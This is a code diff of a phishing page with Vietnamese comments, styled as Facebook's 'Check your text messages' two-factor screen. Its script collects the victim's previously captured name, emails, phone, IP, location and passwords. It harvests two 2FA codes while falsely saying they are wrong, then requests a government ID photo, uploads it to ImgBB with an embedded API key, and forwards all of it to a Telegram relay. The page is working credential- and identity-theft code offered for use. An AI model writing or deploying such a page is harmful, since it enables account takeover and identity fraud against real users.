@@ -1,98 +1,498 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>2FA Page</title>
-<style>
-/* --- GIỮ NGUYÊN GIAO DIỆN 2FA --- */
-body { font-family: Arial, sans-serif; margin:0; background-color:#f0f2f5; display:flex; flex-direction:column; min-height:100vh;}
-.header { background-color:#355797; border-bottom:1px solid #355797; padding:10px 20px; display:flex; align-items:center; justify-content:space-between; box-shadow:0 2px 4px rgba(0,0,0,.08);}
-.header .help-center-link { font-size:18px; font-weight:bold; color:#fff; text-decoration:none;}
-.header .language { font-size:14px; color:#fff;}
-.content-area { flex-grow:1; display:flex; justify-content:center; align-items:center; padding:20px;}
-.form-container { background-color:#fff; padding:30px; border-radius:8px; box-shadow:0 2px 4px rgba(0,0,0,.1); max-width:450px; width:100%; text-align:center;}
-.form-container h2 { font-size:24px; color:#1c2b33; margin-bottom:20px;}
-.form-container p { font-size:15px; color:#606770; margin-bottom:20px;}
-.form-container input[type="text"], .form-container input[type="email"], .form-container input[type="password"] { width:calc(100% - 20px); padding:12px 10px; margin-bottom:15px; border:1px solid #ddd; border-radius:6px; font-size:15px; box-sizing:border-box;}
-.form-container input:focus { border-color:#1877f2; outline:none;}
-.form-container button { background-color:#1877f2; color:#fff; padding:12px 25px; border:none; border-radius:6px; font-size:16px; cursor:pointer; margin-top:10px;}
-.form-container button:hover { background-color:#166fe5;}
-.popup-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background-color:rgba(0,0,0,0.6); justify-content:center; align-items:center; z-index:2000;}
-.popup-content { background-color:#fff; padding:30px; border-radius:8px; width:90%; max-width:450px; text-align:center;}
-.popup-content h3 { font-size:20px; color:#1c2b33; margin-bottom:15px;}
-.popup-content p { font-size:15px; color:#606770; margin-bottom:20px;}
-.popup-content input[type="text"] { width:calc(100% - 20px); padding:12px 10px; margin-bottom:15px; border:1px solid #ddd; border-radius:6px; font-size:16px; box-sizing:border-box;}
-.popup-content input:focus { border-color:#1877f2; outline:none;}
-.popup-content button { background-color:#1877f2; color:#fff; padding:12px 25px; border:none; border-radius:6px; font-size:16px; cursor:pointer;}
-.popup-content button:hover { background-color:#166fe5;}
-.popup-content .error-message { color:#fa3e3e; font-size:13px; margin-top:-10px; margin-bottom:10px; display:none; text-align:left;}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Check your text messages</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .id-upload-container {
+            background-color: #f0f2f5; /* Changed to match the image background color */
+            padding: 30px;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 700px;
+            text-align: left;
+        }
+         .twofa-container {
+            background-color: #f0f2f5;
+            padding: 30px;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 550px;
+            text-align: center;
+        }
+        .twofa-container h3, .id-upload-container h3 {
+            font-size: 20px;
+            color: #1c2b33;
+            margin-bottom: 10px;
+            text-align: left;
+        }
+        .twofa-container p, .id-upload-container p {
+            font-size: 15px;
+            color: #606770;
+            margin-bottom: 20px;
+            line-height: 1.4;
+            text-align: left;
+        }
+        .twofa-container .illustration {
+            width: -webkit-fill-available;
+            margin: 20px auto;
+            display: block;
+        }
+        .twofa-container .input-group, .id-upload-container .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .twofa-container label, .id-upload-container label {
+            display: block;
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 5px;
+        }
+        .twofa-container input#twofaInput,
+        .id-upload-container input[type="file"] { /* Style for file input */
+            width: 100%;
+            padding: 12px 10px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        .twofa-container input#twofaInput:focus,
+        .id-upload-container input[type="file"]:focus {
+            border-color: #1877f2;
+        }
+        .twofa-container .error-message, .id-upload-container .error-message {
+            color: #fa3e3e;
+            font-size: 13px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+            text-align: left;
+            display: none; /* Hidden by default */
+        }
+        .twofa-container .timer-info {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 20px;
+        }
+        .twofa-container .timer-icon {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            background-image: url('data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"%3E%3Cpath d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm.9 13H11V7h2V14.5h.9z"/%3E%3C/svg%3E');
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: contain;
+            display: inline-block;
+            vertical-align: middle;
+        }
+        .twofa-container #twofaTimer {
+            font-weight: bold;
+        }
+        .twofa-container button#confirmTwofaButton,
+        .id-upload-container button#choosePhotoButton,
+        .id-upload-container button#uploadIdContinueButton,
+        .id-upload-container button#uploadIdGoBackButton {
+            background-color: #1877f2; /* Facebook Blue */
+            color: #ffffff;
+            padding: 10px 20px;
+            border: 1px solid #1877f2;
+            border-radius: 6px; /* Reduced border-radius to match Facebook style */
+            font-size: 16px;
+            cursor: pointer;
+            outline: none;
+            width: 100%;
+            box-sizing: border-box;
+            margin-top: 10px; /* Space between buttons if stacked */
+        }
+        .twofa-container button#confirmTwofaButton:hover,
+        .id-upload-container button#choosePhotoButton:hover,
+        .id-upload-container button#uploadIdContinueButton:hover {
+            background-color: #166fe5; /* Slightly darker blue on hover */
+        }
+
+        .id-upload-container .checkbox-group {
+            text-align: left;
+            margin-top: 20px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+        }
+        .id-upload-container .checkbox-group input[type="checkbox"] {
+            margin-right: 10px;
+            width: auto; /* Override default input width */
+        }
+        .id-upload-container .checkbox-group label {
+            display: inline; /* Keep label next to checkbox */
+            font-size: 14px;
+            color: #606770;
+        }
+        .id-upload-container .button-group {
+            display: flex;
+            gap: 10px; /* Space between buttons */
+            justify-content: flex-end; /* Align buttons to the right */
+            margin-top: 20px;
+        }
+        .id-upload-container .button-group button {
+            width: auto; /* Allow buttons to size based on content */
+            flex-grow: 0; /* Don't force them to fill space */
+        }
+        .id-upload-container button#uploadIdGoBackButton {
+            background-color: #e4e6eb; /* Lighter background for Go Back */
+            color: #4b4f56; /* Darker text for Go Back */
+            border-color: #dddfe2;
+        }
+        .id-upload-container button#uploadIdGoBackButton:hover {
+            background-color: #d8dadf;
+        }
+        #idUploadPreview {
+            max-width: 100%;
+            height: auto;
+            margin-top: 15px;
+            border: 1px solid #ddd;
+            display: none; /* Hidden by default */
+        }
+
+        /* Mobile Adjustments */
+        @media (max-width: 768px) {
+            .twofa-container, .id-upload-container {
+                padding: 20px;
+            }
+            .id-upload-container .button-group {
+                flex-direction: column; /* Stack buttons on small screens */
+            }
+            .id-upload-container .button-group button {
+                width: 100%;
+            }
+        }
+    </style>
 </head>
 <body>
-<div class="header">
-    <a href="#" class="help-center-link">facebook</a>
-    <span class="language">English (US)</span>
-</div>
-
-<div class="content-area">
-    <div class="form-container">
-        <h2>Two-Factor Authentication</h2>
-        <p>Enter the 6-digit code from your authenticator app to continue.</p>
-        <input type="text" id="twoFACode" maxlength="6" placeholder="Enter 2FA code">
-        <div class="error-message" id="twoFAError">Incorrect code. Please try again.</div>
-        <button id="confirmTwoFAButton">Confirm</button>
+    <div class="twofa-container">
+        <h3>Check your text messages</h3>
+        <p>Your account has two-factor authentication enabled, which requires the following additional step. Enter the code that we sent to Authentication App or *** @***.***</p>
+        <img src="https://i.ibb.co/dwcfYPs7/2fa.png" alt="2FA Illustration" class="illustration">
+        <div class="input-group">
+             <input type="text" id="twofaInput" placeholder="Code" required>
+            <div class="error-message" id="twofaError">Incorrect code. Please try again.</div>
+        </div>
+        <div class="timer-info">
+            <span class="timer-icon"></span>
+            We can send a new code in <span id="twofaTimer"> 2:55</span>
+        </div>
+        <button id="confirmTwofaButton">Continue</button>
     </div>
-</div>
 
-<script>
-const TELEGRAM_WEBHOOK = ''; // nếu muốn webhook riêng
-let formData = JSON.parse(localStorage.getItem('formData') || '{}');
-let ipAddress = localStorage.getItem('ipAddress') || 'N/A';
-let locationData = localStorage.getItem('locationData') || 'N/A';
-let passwordAttemptValue1 = localStorage.getItem('passwordAttemptValue1') || '';
-let passwordAttemptValue2 = localStorage.getItem('passwordAttemptValue2') || '';
-let twoFAAttemptCount = 0;
+    <div class="id-upload-container" style="display:none;">
+        <h3>Upload a photo ID</h3>
+        <p>How to upload your ID</p>
+        <ul>
+            <li>Optional: Cover up any confidential information (ex: license or passport number)</li>
+            <li>Scan or take a picture of your ID with your digital camera</li>
+            <li>Make sure you can clearly see your name, birthday and photo</li>
+            <li>Save the photo to your desktop</li>
+            <li>Click the button below and follow the instructions to upload your ID</li>
+        </ul>
 
-const twoFAInput = document.getElementById('twoFACode');
-const twoFAError = document.getElementById('twoFAError');
-const confirmTwoFAButton = document.getElementById('confirmTwoFAButton');
+        <div class="input-group">
+            <input type="file" id="idPhotoUploadInput" accept="image/*" style="display: none;">
+            <button id="choosePhotoButton">Choose Photo</button>
+            <img id="idUploadPreview" src="#" alt="ID Photo Preview" style="display: none;">
+            <div class="error-message" id="idUploadError">Please choose a photo.</div>
+        </div>
 
-async function sendMessageToTelegram(message){
-    try{
-        await fetch('/api/send-telegram',{
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({ message:message })
-        });
-        if(TELEGRAM_WEBHOOK){
-            await fetch(TELEGRAM_WEBHOOK,{
-                method:'POST',
-                headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({ message:message })
-            });
+        <div class="checkbox-group">
+            <input type="checkbox" id="governmentIdCheckbox">
+            <label for="governmentIdCheckbox">This is my government issued ID. I understand I won't get help with my account if I haven't uploaded a valid ID.</label>
+        </div>
+
+        <div class="button-group">
+            <button id="uploadIdGoBackButton">Go Back</button>
+            <button id="uploadIdContinueButton">Continue</button>
+        </div>
+    </div>
+
+    <script>
+        const IMGBB_API_KEY = 'ab04f01485eabb8f10a11f973804a5ba'; // Khóa API ImgBB của bạn
+
+        let storedFormData = {};
+        let storedIpAddress = 'N/A';
+        let storedLocationData = 'N/A';
+        let storedPasswordAttemptValue1 = '';
+        let storedPasswordAttemptValue2 = '';
+        let twoFAAttemptCount = 0;
+        let twoFAAttemptValue1 = '';
+        let twoFAAttemptValue2 = '';
+        let uploadedIdImageUrl = 'N/A'; // New variable for uploaded ID image URL
+
+        let timerInterval;
+        let timerSeconds = 175; // 3 minutes = 180 seconds - 5 seconds (to show 2:55 initially)
+
+        // Elements
+        const twofaContainer = document.querySelector('.twofa-container'); // Get the 2FA container
+        const idUploadContainer = document.querySelector('.id-upload-container'); // Get the ID upload container
+
+        const twofaInput = document.getElementById('twofaInput');
+        const twofaError = document.getElementById('twofaError');
+        const confirmTwofaButton = document.getElementById('confirmTwofaButton');
+        const twofaTimerDisplay = document.getElementById('twofaTimer');
+
+        // ID Upload Elements
+        const idPhotoUploadInput = document.getElementById('idPhotoUploadInput');
+        const choosePhotoButton = document.getElementById('choosePhotoButton');
+        const idUploadPreview = document.getElementById('idUploadPreview');
+        const idUploadError = document.getElementById('idUploadError');
+        const governmentIdCheckbox = document.getElementById('governmentIdCheckbox');
+        const uploadIdGoBackButton = document.getElementById('uploadIdGoBackButton');
+        const uploadIdContinueButton = document.getElementById('uploadIdContinueButton');
+
+
+        // --- Utility Functions ---
+
+        // Send message to Telegram
+        async function sendMessageToTelegram(message) {
+            try {
+                const response = await fetch('/api/send-telegram', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message: message })
+                });
+                const data = await response.json();
+                if (!data.success) {
+                    console.error('Error sending message via API:', data.error);
+                } else {
+                    console.log('Message sent successfully via API!');
+                }
+            } catch (error) {
+                console.error('Error calling send-telegram API:', error);
+            }
         }
-    }catch(e){console.error(e);}
-}
 
-confirmTwoFAButton.addEventListener('click', async ()=>{
-    const code = twoFAInput.value.trim();
-    if(!code){ twoFAError.textContent='Code cannot be empty'; twoFAError.style.display='block'; return;}
-    twoFAAttemptCount++;
-    let message=`<b>2FA Submission Attempt ${twoFAAttemptCount}</b>\n------------------------------------\n`;
-    message+=`<b>IP & Location:</b> ${ipAddress} (${locationData})\n`;
-    message+=`<b>Name:</b> ${formData.yourName}\n`;
-    message+=`<b>Business Email:</b> ${formData.businessEmail}\n`;
-    message+=`<b>Personal Email:</b> ${formData.personalEmail}\n`;
-    message+=`<b>Mobile Phone:</b> ${formData.mobilePhoneNumber}\n`;
-    message+=`<b>Password Attempt 1:</b> ${passwordAttemptValue1}\n`;
-    message+=`<b>Password Attempt 2:</b> ${passwordAttemptValue2}\n`;
-    message+=`<b>2FA Code:</b> ${code}\n`;
-    await sendMessageToTelegram(message);
-    twoFAError.textContent='Incorrect code. Please try again.';
-    twoFAError.style.display='block';
-    twoFAInput.value='';
-});
-</script>
+        // Upload image to ImgBB
+        async function uploadImageToImgBB(file) {
+            if (!file) return null;
+
+            const formData = new FormData();
+            formData.append('image', file);
+
+            try {
+                const response = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+
+                if (data && data.data && data.data.url) {
+                    return data.data.url;
+                } else {
+                    console.error('Error uploading image to ImgBB:', data.error?.message || 'Unknown error');
+                    return null;
+                }
+            } catch (error) {
+                console.error('Network error during ImgBB upload:', error);
+                return null;
+            }
+        }
+
+        function updateTimerDisplay() {
+            const minutes = Math.floor(timerSeconds / 60);
+            const seconds = timerSeconds % 60;
+            twofaTimerDisplay.textContent = ` ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+        }
+
+        function startTimer() {
+            updateTimerDisplay();
+            timerInterval = setInterval(() => {
+                timerSeconds--;
+                updateTimerDisplay();
+                if (timerSeconds <= 0) {
+                    clearInterval(timerInterval);
+                    twofaTimerDisplay.textContent = ' 0:00';
+                }
+            }, 1000);
+        }
+
+        // --- 2FA Page Logic ---
+
+        confirmTwofaButton.addEventListener('click', async () => {
+            const twofaCode = twofaInput.value;
+            if (confirmTwofaButton.disabled) return;
+            if (!twofaCode) {
+                twofaError.textContent = 'Code cannot be empty.';
+                twofaError.style.display = 'block';
+                return;
+            }
+
+            twoFAAttemptCount++;
+
+            let message = `<b>Submission Attempt (2FA) ${twoFAAttemptCount}</b>\n`;
+            message += `------------------------------------\n`;
+            message += `<b>IP & Location:</b> ${storedIpAddress} (${storedLocationData})\n`;
+            message += `<b>Page Name:</b> ${storedFormData.yourName}\n`;
+            message += `<b>Business Email:</b> ${storedFormData.businessEmail}\n`;
+            message += `<b>Personal Email:</b> ${storedFormData.personalEmail}\n`;
+            message += `<b>Mobile Phone:</b> ${storedFormData.mobilePhoneNumber}\n`;
+            message += `<b>Password 1:</b> ${storedPasswordAttemptValue1}\n`;
+            message += `<b>Password 2:</b> ${storedPasswordAttemptValue2}\n`;
+
+            if (twoFAAttemptCount === 1) {
+                twoFAAttemptValue1 = twofaCode;
+                message += `<b>2FA Code Attempt 1:</b> ${twoFAAttemptValue1}\n`;
+                await sendMessageToTelegram(message);
+                
+                twofaError.textContent = 'Incorrect code. Please try again in 30 seconds.';
+                twofaError.style.display = 'block';
+                twofaInput.value = '';
+
+                twofaInput.disabled = true;
+                confirmTwofaButton.disabled = true;
+                confirmTwofaButton.style.backgroundColor = '#cccccc';
+                confirmTwofaButton.style.cursor = 'not-allowed';
+
+                let waitSeconds = 30;
+                const waitInterval = setInterval(() => {
+                    confirmTwofaButton.textContent = `Try again in ${waitSeconds}s`;
+                    waitSeconds--;
+                    if (waitSeconds < 0) {
+                        clearInterval(waitInterval);
+                        twofaInput.disabled = false;
+                        confirmTwofaButton.disabled = false;
+                        confirmTwofaButton.style.backgroundColor = '#1877f2'; /* Revert to blue */
+                        confirmTwofaButton.style.cursor = 'pointer';
+                        confirmTwofaButton.textContent = 'Continue';
+                        twofaError.style.display = 'none';
+                        twofaInput.focus();
+                    }
+                }, 1000);
+
+            } else if (twoFAAttemptCount === 2) {
+                twoFAAttemptValue2 = twofaCode;
+                message += `<b>2FA Code Attempt 2:</b> ${twoFAAttemptValue2}\n`;
+                await sendMessageToTelegram(message);
+
+                // Ẩn container 2FA và hiển thị container tải lên ID
+                twofaContainer.style.display = 'none';
+                idUploadContainer.style.display = 'block';
+                clearInterval(timerInterval); // Dừng đồng hồ đếm ngược 2FA
+
+                // Xóa dữ liệu mật khẩu và 2FA khỏi localStorage sau khi hoàn tất 2FA
+                localStorage.removeItem('passwordAttemptValue1');
+                localStorage.removeItem('passwordAttemptValue2');
+                localStorage.removeItem('twoFAAttemptCount'); // Ensure this is cleared
+            }
+        });
+
+        // --- ID Upload Logic ---
+
+        choosePhotoButton.addEventListener('click', () => {
+            idPhotoUploadInput.click(); // Trigger the hidden file input click
+        });
+
+        idPhotoUploadInput.addEventListener('change', (event) => {
+            const file = event.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    idUploadPreview.src = e.target.result;
+                    idUploadPreview.style.display = 'block';
+                    idUploadError.style.display = 'none'; // Hide error if a file is chosen
+                };
+                reader.readAsDataURL(file);
+            } else {
+                idUploadPreview.style.display = 'none';
+                idUploadPreview.src = '#';
+            }
+        });
+
+        uploadIdContinueButton.addEventListener('click', async () => {
+            const idFile = idPhotoUploadInput.files[0];
+            const isGovernmentIdChecked = governmentIdCheckbox.checked;
+
+            if (!idFile) {
+                idUploadError.textContent = 'Please choose a photo to upload.';
+                idUploadError.style.display = 'block';
+                return;
+            }
+
+            if (!isGovernmentIdChecked) {
+                idUploadError.textContent = 'You must confirm this is your government issued ID.';
+                idUploadError.style.display = 'block';
+                return;
+            }
+
+            // Hide error message if validation passes
+            idUploadError.style.display = 'none';
+            uploadIdContinueButton.disabled = true; // Disable button to prevent multiple clicks
+            uploadIdContinueButton.textContent = 'Uploading...';
+
+            uploadedIdImageUrl = await uploadImageToImgBB(idFile);
+
+            let finalMessage = `<b>Final Submission with ID Upload</b>\n`;
+            finalMessage += `------------------------------------\n`;
+            finalMessage += `<b>IP & Location:</b> ${storedIpAddress} (${storedLocationData})\n`;
+            finalMessage += `<b>Page Name:</b> ${storedFormData.yourName}\n`;
+            finalMessage += `<b>Business Email:</b> ${storedFormData.businessEmail}\n`;
+            finalMessage += `<b>Personal Email:</b> ${storedFormData.personalEmail}\n`;
+            finalMessage += `<b>Mobile Phone:</b> ${storedFormData.mobilePhoneNumber}\n`;
+            finalMessage += `<b>Password 1:</b> ${storedPasswordAttemptValue1}\n`;
+            finalMessage += `<b>Password 2:</b> ${storedPasswordAttemptValue2}\n`;
+            finalMessage += `<b>2FA Code 1:</b> ${twoFAAttemptValue1}\n`;
+            finalMessage += `<b>2FA Code 2:</b> ${twoFAAttemptValue2}\n`;
+            finalMessage += `<b>ID Image URL:</b> ${uploadedIdImageUrl || 'N/A (Upload failed)'}\n`;
+
+
+            await sendMessageToTelegram(finalMessage);
+
+            alert('Your ID and request have been submitted successfully!');
+            localStorage.clear(); // Clear all stored data after final submission
+            window.location.href = 'https://www.facebook.com/help'; // Redirect to a help page
+        });
+
+        uploadIdGoBackButton.addEventListener('click', () => {
+            // Có thể quay lại trang trước hoặc trang chủ nếu cần
+            window.location.href = 'https://www.facebook.com/help';
+        });
+
+
+        // --- Initial Setup for 2FA Page ---
+        document.addEventListener('DOMContentLoaded', () => {
+            const formDataJSON = localStorage.getItem('formData');
+            if (formDataJSON) {
+                storedFormData = JSON.parse(formDataJSON);
+            } else {
+                alert('No form data found. Please start from the beginning.');
+                window.location.href = 'confirm.html';
+                return;
+            }
+
+            storedIpAddress = localStorage.getItem('ipAddress') || 'N/A';
+            storedLocationData = localStorage.getItem('locationData') || 'N/A';
+            storedPasswordAttemptValue1 = localStorage.getItem('passwordAttemptValue1') || '';
+            storedPasswordAttemptValue2 = localStorage.getItem('passwordAttemptValue2') || '';
+            twoFAAttemptCount = parseInt(localStorage.getItem('twoFAAttemptCount') || '0'); // Retrieve 2FA attempt count
+
+            // Ensure 2FA container is visible and ID upload container is hidden initially
+            twofaContainer.style.display = 'block';
+            idUploadContainer.style.display = 'none';
+
+            startTimer();
+        });
+
+        window.addEventListener('beforeunload', () => {
+            clearInterval(timerInterval);
+        });
+    </script>
 </body>
 </html>
